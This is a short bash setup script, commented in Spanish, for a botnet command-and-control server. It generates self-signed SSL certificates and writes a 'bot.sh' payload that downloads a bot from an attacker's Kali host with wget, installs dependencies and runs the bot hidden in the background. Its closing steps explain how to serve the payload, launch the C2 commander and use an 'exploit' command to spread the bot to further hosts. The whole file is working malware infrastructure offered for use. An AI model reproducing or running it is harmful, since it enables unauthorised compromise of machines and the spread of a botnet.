#!/bin/bash

echo "[*] Configurando servidor C2..."

# Generar certificados SSL autofirmados
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes \
    -subj "/C=US/ST=State/L=City/O=Org/CN=localhost"

echo "[+] Certificados SSL generados: cert.pem, key.pem"

# Crear payload básico
cat > bot.sh << 'EOF'
#!/bin/bash
cd /tmp
# Descargar el bot (debes poner la URL real de tu servidor)
wget -q -O bot_soldier.py http://TU_IP_KALI/bot_soldier.py
# Instalar dependencias si es necesario
pip3 install paramiko netaddr 2>/dev/null || pip install paramiko netaddr 2>/dev/null
# Ejecutar el bot en segundo plano
nohup python3 bot_soldier.py &
EOF

chmod +x bot.sh

echo "[+] Payload bot.sh creado"
echo ""
echo "PASOS SIGUIENTES:"
echo "1. Edita bot.sh y pon tu IP de Kali en la URL de descarga"
echo "2. Inicia un servidor HTTP: python3 -m http.server 80"
echo "3. Ejecuta el C2: sudo python3 c2_commander.py"
echo "4. Ejecuta el bot inicial: python3 bot_soldier.py"
echo "5. Usa 'exploit <bot> <host> http://TU_IP:80/bot.sh' para expandir"
